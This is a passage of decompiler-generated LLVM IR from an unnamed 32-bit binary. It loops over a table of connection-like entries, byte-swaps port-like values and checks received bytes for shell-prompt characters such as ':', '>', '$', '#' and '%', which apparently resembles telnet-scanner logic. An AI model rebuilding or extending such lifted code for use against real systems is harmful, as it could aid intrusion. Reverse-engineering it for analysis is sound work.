  %v5_805035a = load i16, i16* %v4_805035a, align 2
  %v16_805035a = icmp eq i16 %v3_8050355, %v5_805035a
  %v1_805035f = icmp eq i1 %v16_805035a, false
  br i1 %v1_805035f, label %dec_label_pc_80502e8, label %dec_label_pc_8050361

dec_label_pc_8050361:                             ; preds = %dec_label_pc_8050355
  %v1_8050361 = add i32 %v0_8050313, 123
  %v2_8050361 = inttoptr i32 %v1_8050361 to i8*
  %v3_8050361 = load i8, i8* %v2_8050361, align 1
  %v4_8050361 = zext i8 %v3_8050361 to i32
  %v6_8050361 = and i32 %v7_8050355, -256
  %v7_8050361 = or i32 %v4_8050361, %v6_8050361
  store i32 %v7_8050361, i32* %eax.global-to-local, align 4
  %v2_8050365 = and i8 %v3_8050361, 2
  %v3_8050365 = icmp eq i8 %v2_8050365, 0
  br i1 %v3_8050365, label %dec_label_pc_80502e8, label %dec_label_pc_805036d

dec_label_pc_805036d:                             ; preds = %dec_label_pc_8050361
  %v2_805036d = and i32 %v4_8050361, 16
  %v3_805036d = icmp eq i32 %v2_805036d, 0
  br i1 %v3_805036d, label %dec_label_pc_80502e8, label %dec_label_pc_8050375

dec_label_pc_8050375:                             ; preds = %dec_label_pc_805036d
  %v2_8050375 = and i32 %v4_8050361, 4
  %v3_8050375 = icmp eq i32 %v2_8050375, 0
  %v1_8050377 = icmp eq i1 %v3_8050375, false
  br i1 %v1_8050377, label %dec_label_pc_80502e8, label %dec_label_pc_805037d

dec_label_pc_805037d:                             ; preds = %dec_label_pc_8050375
  %tmp302 = urem i8 %v3_8050361, 2
  %v3_805037d = icmp eq i8 %tmp302, 0
  %v1_805037f = icmp eq i1 %v3_805037d, false
  br i1 %v1_805037f, label %dec_label_pc_80502e8, label %dec_label_pc_8050385

dec_label_pc_8050385:                             ; preds = %dec_label_pc_805037d
  %v1_8050385 = add i32 %v0_8050313, 118
  %v2_8050385 = inttoptr i32 %v1_8050385 to i32*
  %v3_8050385 = load i32, i32* %v2_8050385, align 4
  %v1_8050389 = trunc i32 %v3_8050385 to i16
  %v2_8050389 = call i16 @llvm.bswap.i16(i16 %v1_8050389)
  %v3_8050389 = zext i16 %v2_8050389 to i32
  %v1_805038d = udiv i32 %v3_8050385, 65536
  %v2_805038d = mul nuw i32 %v3_8050389, 65536
  %v1_8050390 = trunc i32 %v1_805038d to i16
  %v2_8050390 = call i16 @llvm.bswap.i16(i16 %v1_8050390)
  %v3_8050390 = zext i16 %v2_8050390 to i32
  %v6_8050390 = or i32 %v3_8050390, %v2_805038d
  store i32 %v6_8050390, i32* %eax.global-to-local, align 4
  %v1_8050394 = add i32 %v6_8050390, -1
  %v1_8050397 = trunc i32 %v1_8050394 to i16
  %v2_8050397 = call i16 @llvm.bswap.i16(i16 %v1_8050397)
  %v3_8050397 = zext i16 %v2_8050397 to i32
  %v1_805039b = udiv i32 %v1_8050394, 65536
  %v2_805039b = mul nuw i32 %v3_8050397, 65536
  %v1_805039e = trunc i32 %v1_805039b to i16
  %v2_805039e = call i16 @llvm.bswap.i16(i16 %v1_805039e)
  %v3_805039e = zext i16 %v2_805039e to i32
  %v6_805039e = or i32 %v3_805039e, %v2_805039b
  store i32 %v6_805039e, i32* %edx.global-to-local, align 4
  %v1_80503a2 = add i32 %v0_8050313, 102
  %v2_80503a2 = inttoptr i32 %v1_80503a2 to i32*
  %v3_80503a2 = load i32, i32* %v2_80503a2, align 4
  %v15_80503a2 = icmp eq i32 %v3_80503a2, %v6_805039e
  %v1_80503a6 = icmp eq i1 %v15_80503a2, false
  br i1 %v1_80503a6, label %dec_label_pc_80502e8, label %dec_label_pc_80503ac

dec_label_pc_80503ac:                             ; preds = %dec_label_pc_8050385
  %v0_80503ac = load i32, i32* @ebx, align 4
  %v1_80503ac = add i32 %v0_80503ac, -127
  %v6_80503ac = sub i32 126, %v0_80503ac
  %v7_80503ac = and i32 %v6_80503ac, %v0_80503ac
  %v8_80503ac = icmp slt i32 %v7_80503ac, 0
  %v9_80503ac = icmp eq i32 %v1_80503ac, 0
  %v10_80503ac = icmp slt i32 %v1_80503ac, 0
  %v3_80503af = icmp eq i1 %v10_80503ac, %v8_80503ac
  %v4_80503af = icmp eq i1 %v9_80503ac, false
  %v5_80503af = and i1 %v4_80503af, %v3_80503af
  br i1 %v5_80503af, label %dec_label_pc_80503f5, label %dec_label_pc_80503b1

dec_label_pc_80503b1:                             ; preds = %dec_label_pc_80503ac
  %v0_80503b4 = load i32, i32* @global_var_8056938.45, align 8
  store i32 %v0_80503b4, i32* %ecx.global-to-local, align 4
  %v2_80503ba = mul i32 %v0_80503ac, 288
  %v2_80503bd = add i32 %v0_80503b4, %v2_80503ba
  store i32 %v2_80503bd, i32* @eax, align 4
  %v1_80503bf = add i32 %v2_80503bd, 12
  %v2_80503bf = inttoptr i32 %v1_80503bf to i32*
  %v3_80503bf = load i32, i32* %v2_80503bf, align 4
  %v1_80503c2 = add i32 %v2_80503bd, 288
  store i32 %v1_80503c2, i32* %ecx.global-to-local, align 4
  %v1_80503c8 = icmp eq i32 %v3_80503bf, 0
  br i1 %v1_80503c8, label %dec_label_pc_80503e4, label %dec_label_pc_80503cc

dec_label_pc_80503cc:                             ; preds = %dec_label_pc_80503b1, %dec_label_pc_80503d5
  %v0_80503d5 = phi i32 [ %v1_80503d7, %dec_label_pc_80503d5 ], [ %v1_80503c2, %dec_label_pc_80503b1 ]
  %v0_80503cc = phi i32 [ %v1_80503cc, %dec_label_pc_80503d5 ], [ %v0_80503ac, %dec_label_pc_80503b1 ]
  %v1_80503cc = add i32 %v0_80503cc, 1
  store i32 %v1_80503cc, i32* @ebx, align 4
  %v6_80503cd = icmp eq i32 %v0_80503cc, 127
  br i1 %v6_80503cd, label %dec_label_pc_80503f5.loopexit, label %dec_label_pc_80503d5

dec_label_pc_80503d5:                             ; preds = %dec_label_pc_80503cc
  store i32 %v0_80503d5, i32* @eax, align 4
  %v1_80503d7 = add i32 %v0_80503d5, 288
  store i32 %v1_80503d7, i32* %ecx.global-to-local, align 4
  %v1_80503dd = add i32 %v0_80503d5, 12
  %v2_80503dd = inttoptr i32 %v1_80503dd to i32*
  %v3_80503dd = load i32, i32* %v2_80503dd, align 4
  store i32 %v3_80503dd, i32* @edi, align 4
  %v1_80503e0 = icmp eq i32 %v3_80503dd, 0
  %v1_80503e2 = icmp eq i1 %v1_80503e0, false
  br i1 %v1_80503e2, label %dec_label_pc_80503cc, label %dec_label_pc_80503e4.loopexit

dec_label_pc_80503e4.loopexit:                    ; preds = %dec_label_pc_80503d5
  br label %dec_label_pc_80503e4

dec_label_pc_80503e4:                             ; preds = %dec_label_pc_80503e4.loopexit, %dec_label_pc_80503b1
  %v1_80503e4 = phi i32 [ %v0_80503d5, %dec_label_pc_80503e4.loopexit ], [ %v2_80503bd, %dec_label_pc_80503b1 ]
  %v2_80503e4 = add i32 %v1_80503e4, 16
  %v3_80503e4 = inttoptr i32 %v2_80503e4 to i32*
  store i32 %v6_805039e, i32* %v3_80503e4, align 4
  %v0_80503e7 = load i32, i32* %esi.global-to-local, align 4
  %v1_80503e7 = trunc i32 %v0_80503e7 to i16
  %v2_80503e7 = load i32, i32* @eax, align 4
  %v3_80503e7 = add i32 %v2_80503e7, 20
  %v4_80503e7 = inttoptr i32 %v3_80503e7 to i16*
  store i16 %v1_80503e7, i16* %v4_80503e7, align 2
  %v0_80503eb = call i32 @function_804f7b0()
  store i32 %v0_80503eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80502e8

dec_label_pc_80503f5.loopexit:                    ; preds = %dec_label_pc_80503cc
  br label %dec_label_pc_80503f5

dec_label_pc_80503f5:                             ; preds = %dec_label_pc_80503ac, %dec_label_pc_805031e, %dec_label_pc_80502e8, %dec_label_pc_80503f5.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_80503fe = add i32 %v0_8050313, 44
  %v2_80503fe = inttoptr i32 %v1_80503fe to i32*
  %v3_80503fe = load i32, i32* %v2_80503fe, align 4
  %v4_80503fe = inttoptr i32 %v3_80503fe to i8*
  %v5_8050403 = call i8* @_memset(i8* %v4_80503fe, i32 0, i32 32)
  %v0_8050405 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050405, i32* %ecx.global-to-local, align 4
  %v0_8050407 = load i32, i32* @esp, align 4
  %v1_8050407 = add i32 %v0_8050407, 8
  %v2_8050407 = inttoptr i32 %v1_8050407 to i32*
  %v3_8050407 = load i32, i32* %v2_8050407, align 4
  %v4_8050407 = inttoptr i32 %v3_8050407 to i8*
  store i1 false, i1* @df, align 1
  %v2_805040c = load i32, i32* %eax.global-to-local, align 4
  %v5_805040c = call i8* @_memset(i8* %v4_8050407, i32 %v2_805040c, i32 %v0_8050405)
  %v6_805040c = ptrtoint i8* %v5_805040c to i32
  store i32 %v6_805040c, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_8050410 = load i32, i32* @esp, align 4
  %v1_8050410 = add i32 %v0_8050410, 1868
  %v2_8050410 = inttoptr i32 %v1_8050410 to i32*
  store i32 0, i32* %v2_8050410, align 4
  store i32 0, i32* @esi, align 4
  %v0_805041d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805041d

dec_label_pc_805041d:                             ; preds = %dec_label_pc_8050470, %dec_label_pc_80503f5
  %v0_805041d = phi i32 [ %v0_805047f, %dec_label_pc_8050470 ], [ %v0_805041d.pre, %dec_label_pc_80503f5 ]
  %v0_8050420 = load i32, i32* @global_var_8056938.45, align 8
  store i32 %v0_8050420, i32* %eax.global-to-local, align 4
  %v2_8050425 = mul i32 %v0_805041d, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_805042d = add i32 %v0_8050420, %v2_8050425
  store i32 %v2_805042d, i32* @ebx, align 4
  %v1_805042f = add i32 %v2_805042d, 12
  %v2_805042f = inttoptr i32 %v1_805042f to i32*
  %v3_805042f = load i32, i32* %v2_805042f, align 4
  store i32 %v3_805042f, i32* %edx.global-to-local, align 4
  %v1_8050432 = add i32 %v3_805042f, -1
  %v5_8050432 = icmp eq i32 %v3_805042f, 0
  %v9_8050432 = icmp eq i32 %v1_8050432, 0
  %v2_8050435 = or i1 %v5_8050432, %v9_8050432
  br i1 %v2_8050435, label %dec_label_pc_8050fd2, label %dec_label_pc_805043b

dec_label_pc_805043b:                             ; preds = %dec_label_pc_805041d, %dec_label_pc_8050fda
  %v1_8050445 = phi i32 [ 30, %dec_label_pc_805041d ], [ 5, %dec_label_pc_8050fda ]
  %v0_805043b = load i32, i32* @global_var_80568f0.34, align 16
  store i32 %v0_805043b, i32* %eax.global-to-local, align 4
  %v1_8050440 = add i32 %v2_805042d, 8
  %v2_8050440 = inttoptr i32 %v1_8050440 to i32*
  %v3_8050440 = load i32, i32* %v2_8050440, align 4
  %v2_8050443 = sub i32 %v0_805043b, %v3_8050440
  store i32 %v2_8050443, i32* %eax.global-to-local, align 4
  %tmp296 = icmp ugt i32 %v2_8050443, %v1_8050445
  br i1 %tmp296, label %dec_label_pc_8050f70, label %dec_label_pc_805044d

dec_label_pc_805044d:                             ; preds = %dec_label_pc_805043b
  store i32 %v1_8050432, i32* %edx.global-to-local, align 4
  %v1_8050f45 = add i32 %v2_805042d, 4
  %v2_8050f45 = inttoptr i32 %v1_8050f45 to i32*
  %v3_8050f45 = load i32, i32* %v2_8050f45, align 4
  %v1_8050f4a = urem i32 %v3_8050f45, 32
  store i32 %v1_8050f4a, i32* %eax.global-to-local, align 4
  %v2_8050f4d = udiv i32 %v3_8050f45, 32
  store i32 %v2_8050f4d, i32* %edx.global-to-local, align 4
  %v0_8050f50 = load i32, i32* @esp, align 4
  %v2_8050f50 = mul nuw nsw i32 %v2_8050f4d, 4
  br i1 %v9_8050432, label %dec_label_pc_8050f45, label %dec_label_pc_8050454

dec_label_pc_8050454:                             ; preds = %dec_label_pc_805044d
  %v3_805045f = add nuw nsw i32 %v2_8050f50, 1700
  %v4_805045f = add i32 %v3_805045f, %v0_8050f50
  %v5_805045f = inttoptr i32 %v4_805045f to i32*
  %v6_805045f = load i32, i32* %v5_805045f, align 4
  %v9_805045f = shl i32 1, %v1_8050f4a
  %v12_805045f = or i32 %v6_805045f, %v9_805045f
  store i32 %v12_805045f, i32* %v5_805045f, align 4
  %v0_8050467 = load i32, i32* @ebx, align 4
  %v1_8050467 = add i32 %v0_8050467, 4
  %v2_8050467 = inttoptr i32 %v1_8050467 to i32*
  %v3_8050467 = load i32, i32* %v2_8050467, align 4
  store i32 %v3_8050467, i32* %eax.global-to-local, align 4
  %v0_805046a = load i32, i32* @edi, align 4
  %v2_805046a = sub i32 %v0_805046a, %v3_8050467
  %v8_805046a = xor i32 %v0_805046a, %v3_8050467
  %v9_805046a = xor i32 %v2_805046a, %v0_805046a
  %v10_805046a = and i32 %v9_805046a, %v8_805046a
  %v11_805046a = icmp slt i32 %v10_805046a, 0
  %v13_805046a = icmp slt i32 %v2_805046a, 0
  %v2_805046c = icmp eq i1 %v13_805046a, %v11_805046a
  br i1 %v2_805046c, label %dec_label_pc_8050470, label %dec_label_pc_805046e

dec_label_pc_805046e:                             ; preds = %dec_label_pc_8050454
  store i32 %v3_8050467, i32* @edi, align 4
  br label %dec_label_pc_8050470

dec_label_pc_8050470:                             ; preds = %dec_label_pc_8050fd2, %dec_label_pc_8050f45, %dec_label_pc_8050454, %dec_label_pc_8050fbf, %dec_label_pc_8050f9d, %dec_label_pc_8050f63, %dec_label_pc_805046e
  %v0_8050470 = load i32, i32* @esp, align 4
  %v1_8050470 = add i32 %v0_8050470, 1868
  %v2_8050470 = inttoptr i32 %v1_8050470 to i32*
  %v3_8050470 = load i32, i32* %v2_8050470, align 4
  %v1_8050477 = add i32 %v3_8050470, 1
  store i32 %v1_8050477, i32* %eax.global-to-local, align 4
  store i32 %v1_8050477, i32* %v2_8050470, align 4
  %v0_805047f = load i32, i32* %eax.global-to-local, align 4
  %v1_805047f = add i32 %v0_805047f, -127
  %v6_805047f = sub i32 126, %v0_805047f
  %v7_805047f = and i32 %v6_805047f, %v0_805047f
  %v8_805047f = icmp slt i32 %v7_805047f, 0
  %v9_805047f = icmp eq i32 %v1_805047f, 0
  %v10_805047f = icmp slt i32 %v1_805047f, 0
  %v3_8050482 = icmp ne i1 %v10_805047f, %v8_805047f
  %v4_8050482 = or i1 %v9_805047f, %v3_8050482
  br i1 %v4_8050482, label %dec_label_pc_805041d, label %dec_label_pc_8050484

dec_label_pc_8050484:                             ; preds = %dec_label_pc_8050470
  %v0_8050484 = load i32, i32* @esp, align 4
  %v1_8050484 = add i32 %v0_8050484, 1860
  %v2_8050484 = inttoptr i32 %v1_8050484 to i32*
  store i32 0, i32* %v2_8050484, align 4
  %v0_805048f = load i32, i32* @esp, align 4
  %v1_805048f = add i32 %v0_805048f, 1856
  %v2_805048f = inttoptr i32 %v1_805048f to i32*
  store i32 1, i32* %v2_805048f, align 4
  %v0_805049a = load i32, i32* @esp, align 4
  %v0_805049d = load i32, i32* @edi, align 4
  %v1_805049d = load i32, i32* @esi, align 4
  %v2_805049d = sub i32 %v0_805049d, %v1_805049d
  %v8_805049d = xor i32 %v1_805049d, %v0_805049d
  %v9_805049d = xor i32 %v2_805049d, %v0_805049d
  %v10_805049d = and i32 %v9_805049d, %v8_805049d
  %v11_805049d = icmp slt i32 %v10_805049d, 0
  %v13_805049d = icmp slt i32 %v2_805049d, 0
  %v1_805049f = add i32 %v0_805049a, 1856
  %v2_80504a6 = add i32 %v0_805049a, -16
  %v3_80504a6 = inttoptr i32 %v2_80504a6 to i32*
  store i32 %v1_805049f, i32* %v3_80504a6, align 4
  %v1_80504a7 = add i32 %v0_805049a, -20
  %v2_80504a7 = inttoptr i32 %v1_80504a7 to i32*
  store i32 0, i32* %v2_80504a7, align 4
  %v1_80504a9 = add i32 %v0_805049a, 1572
  store i32 %v1_80504a9, i32* %edx.global-to-local, align 4
  %v0_80504b0 = load i32, i32* @edi, align 4
  store i32 %v0_80504b0, i32* %eax.global-to-local, align 4
  %v2_80504b2 = add i32 %v0_805049a, -24
  %v3_80504b2 = inttoptr i32 %v2_80504b2 to i32*
  store i32 %v1_80504a9, i32* %v3_80504b2, align 4
  %v1_80504b3 = add i32 %v0_805049a, 1700
  store i32 %v1_80504b3, i32* %ecx.global-to-local, align 4
  %v2_80504ba = add i32 %v0_805049a, -28
  %v3_80504ba = inttoptr i32 %v2_80504ba to i32*
  store i32 %v1_80504b3, i32* %v3_80504ba, align 4
  %v2_80504bb = icmp eq i1 %v13_805049d, %v11_805049d
  br i1 %v2_80504bb, label %dec_label_pc_8050484.dec_label_pc_80504bf_crit_edge, label %dec_label_pc_80504bd

dec_label_pc_8050484.dec_label_pc_80504bf_crit_edge: ; preds = %dec_label_pc_8050484
  %v0_80504bf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504bf

dec_label_pc_80504bd:                             ; preds = %dec_label_pc_8050484
  %v0_80504bd = load i32, i32* @esi, align 4
  store i32 %v0_80504bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504bf

dec_label_pc_80504bf:                             ; preds = %dec_label_pc_8050484.dec_label_pc_80504bf_crit_edge, %dec_label_pc_80504bd
  %v0_80504bf = phi i32 [ %v0_80504bf.pre, %dec_label_pc_8050484.dec_label_pc_80504bf_crit_edge ], [ %v0_80504bd, %dec_label_pc_80504bd ]
  %v1_80504bf = add i32 %v0_80504bf, 1
  store i32 %v1_80504bf, i32* %eax.global-to-local, align 4
  %v2_80504c0 = add i32 %v0_805049a, -32
  %v3_80504c0 = inttoptr i32 %v2_80504c0 to i32*
  store i32 %v1_80504bf, i32* %v3_80504c0, align 4
  %v0_80504c1 = call i32 @function_8052398()
  store i32 %v0_80504c1, i32* %eax.global-to-local, align 4
  %v0_80504c6 = load i32, i32* @esp, align 4
  %v1_80504c9 = add i32 %v0_80504c6, 16
  %v2_80504c9 = inttoptr i32 %v1_80504c9 to i32*
  store i32 0, i32* %v2_80504c9, align 4
  %v2_80504cb = call i32 @function_8052452(i32* nonnull @0)
  %v0_80504d0 = load i32, i32* @esp, align 4
  %v1_80504d0 = add i32 %v0_80504d0, 1884
  %v2_80504d0 = inttoptr i32 %v1_80504d0 to i32*
  store i32 0, i32* %v2_80504d0, align 4
  store i32 %v2_80504cb, i32* @global_var_80568f0.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504e5

dec_label_pc_80504e5:                             ; preds = %dec_label_pc_805052e, %dec_label_pc_80504bf
  %v0_80504e5 = phi i32 [ %v0_805053d, %dec_label_pc_805052e ], [ 0, %dec_label_pc_80504bf ]
  %v0_80504e8 = load i32, i32* @global_var_8056938.45, align 8
  store i32 %v0_80504e8, i32* %eax.global-to-local, align 4
  %v2_80504ed = mul i32 %v0_80504e5, 288
  %v2_80504f0 = add i32 %v0_80504e8, %v2_80504ed
  store i32 %v2_80504f0, i32* @edi, align 4
  %v1_80504f2 = add i32 %v2_80504f0, 4
  %v2_80504f2 = inttoptr i32 %v1_80504f2 to i32*
  %v3_80504f2 = load i32, i32* %v2_80504f2, align 4
  store i32 %v3_80504f2, i32* %ecx.global-to-local, align 4
  %v10_80504f5 = icmp eq i32 %v3_80504f2, -1
  br i1 %v10_80504f5, label %dec_label_pc_805052e, label %dec_label_pc_80504fa

dec_label_pc_80504fa:                             ; preds = %dec_label_pc_80504e5
  %v2_80504fe = udiv i32 %v3_80504f2, 32
  store i32 %v2_80504fe, i32* %edx.global-to-local, align 4
  %v1_8050501 = urem i32 %v3_80504f2, 32
  store i32 %v1_8050501, i32* %eax.global-to-local, align 4
  %v0_8050504 = load i32, i32* @esp, align 4
  %v2_8050504 = mul nuw nsw i32 %v2_80504fe, 4
  %v3_8050504 = add nuw nsw i32 %v2_8050504, 1572
  %v4_8050504 = add i32 %v3_8050504, %v0_8050504
  %v5_8050504 = inttoptr i32 %v4_8050504 to i32*
  %v6_8050504 = load i32, i32* %v5_8050504, align 4
  %v9_8050504 = shl i32 1, %v1_8050501
  %v10_8050504 = and i32 %v6_8050504, %v9_8050504
  %v11_8050504 = icmp ne i32 %v10_8050504, 0
  %v1_805050c = zext i1 %v11_8050504 to i32
  store i32 %v1_805050c, i32* %eax.global-to-local, align 4
  %v4_805050f = icmp eq i1 %v11_8050504, false
  %v1_8050511 = icmp eq i1 %v4_805050f, false
  br i1 %v1_8050511, label %dec_label_pc_8050e7b, label %dec_label_pc_8050517

dec_label_pc_8050517:                             ; preds = %dec_label_pc_80504fa, %dec_label_pc_8050f0b
  %v0_805051f = phi i32 [ %v0_8050504, %dec_label_pc_80504fa ], [ %v0_805051f.pre, %dec_label_pc_8050f0b ]
  %v0_8050517 = phi i32 [ %v3_80504f2, %dec_label_pc_80504fa ], [ %v0_8050517.pre, %dec_label_pc_8050f0b ]
  %v2_8050519 = udiv i32 %v0_8050517, 32
  store i32 %v2_8050519, i32* %ecx.global-to-local, align 4
  %v1_805051c = urem i32 %v0_8050517, 32
  store i32 %v1_805051c, i32* %eax.global-to-local, align 4
  %v2_805051f = mul nuw nsw i32 %v2_8050519, 4
  %v3_805051f = add i32 %v0_805051f, 1700
  %v4_805051f = add i32 %v3_805051f, %v2_805051f
  %v5_805051f = inttoptr i32 %v4_805051f to i32*
  %v6_805051f = load i32, i32* %v5_805051f, align 4
  %v9_805051f = shl i32 1, %v1_805051c
  %v10_805051f = and i32 %v6_805051f, %v9_805051f
  %v11_805051f = icmp ne i32 %v10_805051f, 0
  %v1_8050527 = zext i1 %v11_805051f to i32
  store i32 %v1_8050527, i32* %eax.global-to-local, align 4
  %v4_805052a = icmp eq i1 %v11_805051f, false
  %v1_805052c = icmp eq i1 %v4_805052a, false
  br i1 %v1_805052c, label %dec_label_pc_8050583.preheader, label %dec_label_pc_805052e

dec_label_pc_8050583.preheader:                   ; preds = %dec_label_pc_8050517
  %v0_805058327 = load i32, i32* @edi, align 4
  %v1_805058328 = add i32 %v0_805058327, 12
  %v2_805058329 = inttoptr i32 %v1_805058328 to i32*
  %v3_805058330 = load i32, i32* %v2_805058329, align 4
  store i32 %v3_805058330, i32* %eax.global-to-local, align 4
  %v1_805058631 = icmp eq i32 %v3_805058330, 0
  br i1 %v1_805058631, label %dec_label_pc_805052e, label %dec_label_pc_805058a

dec_label_pc_805052e:                             ; preds = %dec_label_pc_8050583.backedge, %dec_label_pc_8050583.preheader, %dec_label_pc_8050aeb, %dec_label_pc_8050517, %dec_label_pc_80504e5, %dec_label_pc_8050ff7, %dec_label_pc_8050f1c, %dec_label_pc_8050b23
  %v0_805052e = load i32, i32* @esp, align 4
  %v1_805052e = add i32 %v0_805052e, 1868
  %v2_805052e = inttoptr i32 %v1_805052e to i32*
  %v3_805052e = load i32, i32* %v2_805052e, align 4
  %v1_8050535 = add i32 %v3_805052e, 1
  store i32 %v1_8050535, i32* %eax.global-to-local, align 4
  store i32 %v1_8050535, i32* %v2_805052e, align 4
  %v0_805053d = load i32, i32* %eax.global-to-local, align 4
  %v1_805053d = add i32 %v0_805053d, -127
  %v6_805053d = sub i32 126, %v0_805053d
  %v7_805053d = and i32 %v6_805053d, %v0_805053d
  %v8_805053d = icmp slt i32 %v7_805053d, 0
  %v9_805053d = icmp eq i32 %v1_805053d, 0
  %v10_805053d = icmp slt i32 %v1_805053d, 0
  %v3_8050540 = icmp ne i1 %v10_805053d, %v8_805053d
  %v4_8050540 = or i1 %v9_805053d, %v3_8050540
  br i1 %v4_8050540, label %dec_label_pc_80504e5, label %dec_label_pc_8050542

dec_label_pc_8050547:                             ; preds = %dec_label_pc_80505f5
  %v1_8050547 = add i32 %v0_80505f5, 24
  %v2_8050547 = inttoptr i32 %v1_8050547 to i32*
  %v3_8050547 = load i32, i32* %v2_8050547, align 4
  %v1_805054a = add i32 %v3_8050547, -1
  store i32 %v1_805054a, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v1_805054a, 1
  br i1 %tmp136, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_805054f.preheader

dec_label_pc_805054f.preheader:                   ; preds = %dec_label_pc_8050547
  %v7_805054f.pre = load i32, i32* @edx, align 4
  %v2_805054f = add i32 %v0_80505f5, 28
  br label %dec_label_pc_805054f

dec_label_pc_805054f:                             ; preds = %dec_label_pc_805054f.preheader, %dec_label_pc_8050580
  %v7_805054f = phi i32 [ %v7_805054f.pre, %dec_label_pc_805054f.preheader ], [ %v9_805054f, %dec_label_pc_8050580 ]
  %v0_8050d78 = phi i32 [ %v1_805054a, %dec_label_pc_805054f.preheader ], [ %v1_8050580, %dec_label_pc_8050580 ]
  %v3_805054f = add i32 %v2_805054f, %v0_8050d78
  %v4_805054f = inttoptr i32 %v3_805054f to i8*
  %v5_805054f = load i8, i8* %v4_805054f, align 1
  %v6_805054f = zext i8 %v5_805054f to i32
  %v8_805054f = and i32 %v7_805054f, -256
  %v9_805054f = or i32 %v6_805054f, %v8_805054f
  store i32 %v9_805054f, i32* %edx.global-to-local, align 4
  %v10_8050553 = icmp eq i8 %v5_805054f, 58
  br i1 %v10_8050553, label %dec_label_pc_8050d78, label %dec_label_pc_805055c

dec_label_pc_805055c:                             ; preds = %dec_label_pc_805054f
  %v10_805055c = icmp eq i8 %v5_805054f, 62
  br i1 %v10_805055c, label %dec_label_pc_8050d78, label %dec_label_pc_8050565

dec_label_pc_8050565:                             ; preds = %dec_label_pc_805055c
  %v10_8050565 = icmp eq i8 %v5_805054f, 36
  br i1 %v10_8050565, label %dec_label_pc_8050d78, label %dec_label_pc_805056e

dec_label_pc_805056e:                             ; preds = %dec_label_pc_8050565
  %v10_805056e = icmp eq i8 %v5_805054f, 35
  br i1 %v10_805056e, label %dec_label_pc_8050d78, label %dec_label_pc_8050577

dec_label_pc_8050577:                             ; preds = %dec_label_pc_805056e
  %v10_8050577 = icmp eq i8 %v5_805054f, 37
  br i1 %v10_8050577, label %dec_label_pc_8050d78, label %dec_label_pc_8050580

dec_label_pc_8050580:                             ; preds = %dec_label_pc_8050577
  %v1_8050580 = add i32 %v0_8050d78, -1
  %v8_8050580 = icmp eq i32 %v1_8050580, 0
  store i32 %v1_8050580, i32* %eax.global-to-local, align 4
  %v1_8050581 = icmp eq i1 %v8_8050580, false
  br i1 %v1_8050581, label %dec_label_pc_805054f, label %dec_label_pc_8050583.backedge

dec_label_pc_8050583.backedge:                    ; preds = %dec_label_pc_8050a23.thread, %dec_label_pc_8050583.loopexit12.loopexit, %dec_label_pc_8050a10, %dec_label_pc_80507bd, %dec_label_pc_8050945, %dec_label_pc_8050802, %dec_label_pc_8050580
  %v0_8050583 = phi i32 [ %v0_80505f5, %dec_label_pc_8050580 ], [ %v0_80505f5, %dec_label_pc_8050802 ], [ %v0_80505f5, %dec_label_pc_8050945 ], [ %v0_80505f5, %dec_label_pc_80507bd ], [ %v0_80505f5, %dec_label_pc_8050a10 ], [ %v0_8050583.pre.pre, %dec_label_pc_8050583.loopexit12.loopexit ], [ %v0_80505f5, %dec_label_pc_8050a23.thread ]
  %v1_8050583 = add i32 %v0_8050583, 12
  %v2_8050583 = inttoptr i32 %v1_8050583 to i32*
  %v3_8050583 = load i32, i32* %v2_8050583, align 4
  store i32 %v3_8050583, i32* %eax.global-to-local, align 4
  %v1_8050586 = icmp eq i32 %v3_8050583, 0
  br i1 %v1_8050586, label %dec_label_pc_805052e, label %dec_label_pc_8050583.backedge.dec_label_pc_805058a_crit_edge

dec_label_pc_8050583.backedge.dec_label_pc_805058a_crit_edge: ; preds = %dec_label_pc_8050583.backedge
  %v1_805058d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805058a

dec_label_pc_8050583.loopexit12.loopexit:         ; preds = %dec_label_pc_8050a23, %dec_label_pc_8050755, %dec_label_pc_80506f6, %dec_label_pc_80505f5, %dec_label_pc_8050c86, %dec_label_pc_80509d3, %dec_label_pc_805095a, %dec_label_pc_805091c, %dec_label_pc_805084d, %dec_label_pc_8050c0d, %dec_label_pc_80507c5, %dec_label_pc_8050cff, %dec_label_pc_8050780, %dec_label_pc_8050d78, %dec_label_pc_8050547
  %v0_8050583.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050583.backedge

dec_label_pc_805058a:                             ; preds = %dec_label_pc_8050583.preheader, %dec_label_pc_8050583.backedge.dec_label_pc_805058a_crit_edge
  %v1_805058d = phi i32 [ %v1_805058d.pre, %dec_label_pc_8050583.backedge.dec_label_pc_805058a_crit_edge ], [ %v0_805051f, %dec_label_pc_8050583.preheader ]
  %v0_805058a = phi i32 [ %v0_8050583, %dec_label_pc_8050583.backedge.dec_label_pc_805058a_crit_edge ], [ %v0_805058327, %dec_label_pc_8050583.preheader ]
  %v1_805058a = add i32 %v0_805058a, 28
  store i32 %v1_805058a, i32* %eax.global-to-local, align 4
  %v2_805058d = add i32 %v1_805058d, 16
  %v3_805058d = inttoptr i32 %v2_805058d to i32*
  store i32 %v1_805058a, i32* %v3_805058d, align 4
  %v0_8050591 = load i32, i32* @edi, align 4
  %v1_8050591 = add i32 %v0_8050591, 24
  %v2_8050591 = inttoptr i32 %v1_8050591 to i32*
  %v3_8050591 = load i32, i32* %v2_8050591, align 4
  %v9_8050591 = icmp eq i32 %v3_8050591, 256
  br i1 %v9_8050591, label %dec_label_pc_8050b47, label %dec_label_pc_805059e

dec_label_pc_805059e:                             ; preds = %dec_label_pc_805058a, %dec_label_pc_8050b47
  %v0_805059e = load i32, i32* @esp, align 4
  %v1_805059e = add i32 %v0_805059e, 40
  %v2_805059e = inttoptr i32 %v1_805059e to i32*
  %v3_805059e = load i32, i32* %v2_805059e, align 4
